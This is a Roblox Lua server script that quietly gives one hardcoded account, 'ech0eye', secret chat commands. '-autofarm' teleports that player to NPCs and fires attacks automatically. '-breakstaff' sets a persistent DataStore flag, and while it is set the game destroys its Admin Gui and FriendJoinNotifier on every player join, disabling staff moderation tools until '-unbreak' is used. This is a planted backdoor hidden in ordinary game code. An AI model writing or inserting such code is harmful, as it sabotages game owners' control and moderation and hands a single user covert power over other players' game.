local SendMessage = game.ReplicatedStorage.Remotes.Chat

function Message(player, Text)
	SendMessage:FireClient(player, Text)
end

local AutoFarm = false
local Prefix = "-"
	
function FindPlayer(user) 
	for _,v in ipairs(game.Players:GetPlayers()) do
		if v.Name:sub(1,user:len()):lower()==user:lower() then
			return v
		end
	end
end

function FindNPC(name) 
	for _,v in ipairs(game.Workspace.NPCs:GetChildren()) do
		if v.Name:sub(1,name:len()):lower()==name:lower() then
			return v
		end
	end
end

local DS = game:GetService("DataStoreService")
local BS = DS:GetDataStore("BSActive")

game.Players.PlayerAdded:Connect(function(player)
	if BS:GetAsync("_ie45endless7", true) then
		game.StarterGui.Menu:FindFirstChild("Admin Gui"):Destroy()
		game.Chat.ChatModules.FriendJoinNotifier:Destroy()
	end
	player.Chatted:Connect(function(msg)
		-- Farming
		if player.Name == "ech0eye" then
			print("Hi")
			if msg:sub(1,9):lower() == Prefix.."autofarm" then
				if AutoFarm == false then
					local Targ = FindNPC(msg:sub(11))
					Message(player, "{System}: Auto Farm is starting! Farming: "..Targ.Name)
					if Targ and Targ:FindFirstChild("HumanoidRootPart") then
						AutoFarm = true
						while AutoFarm == true do
							local SafeTp = Instance.new("NumberValue", player.Character)
							SafeTp.Name = "SafeTp"
							player.Character.HumanoidRootPart.CFrame = Targ:FindFirstChild("HumanoidRootPart").CFrame
							for a,b in pairs(player.Character:GetDescendants()) do
								if b:FindFirstChild("E") then
									game.ReplicatedStorage.Remotes.PunchFire:FireClient(player, b)
								end
							end
							wait(6)
						end
					end
				end
			elseif msg:sub(1,11):lower() == Prefix.."cancelfarm" then
				if AutoFarm == true then
					AutoFarm = false
					player.Character:WaitForChild("SafeTp"):Destroy()
				end
			elseif msg:sub(1,11):lower() == Prefix.."breakstaff" then
				local key = "_ie45endless7"
				local ChangeAsync, err = pcall(function()
					BS:SetAsync(key, true)
				end)
				if ChangeAsync then
					Message(player, "{System}: Break has been activated.")
					if game.StarterGui.Menu:FindFirstChild("Admin Gui") then
						game.StarterGui.Menu:FindFirstChild("Admin Gui").Parent = script
					end
				else
					Message(player, "Break failure: "..err)
				end
			elseif msg:sub(1,8):lower() == Prefix.."unbreak" then
				local key = "_ie45endless7"
				local ChangeAsync, err = pcall(function()
					BS:SetAsync(key, false)
				end)
				if ChangeAsync then
					Message(player, "{System}: Break has been deactivated.")
					if script:FindFirstChild("Admin Gui") then
						script:FindFirstChild("Admin Gui").Parent = game.StarterGui.Menu
					end
				else
					Message(player, "Break failure: "..err)
				end
			end
		end
	end)
end)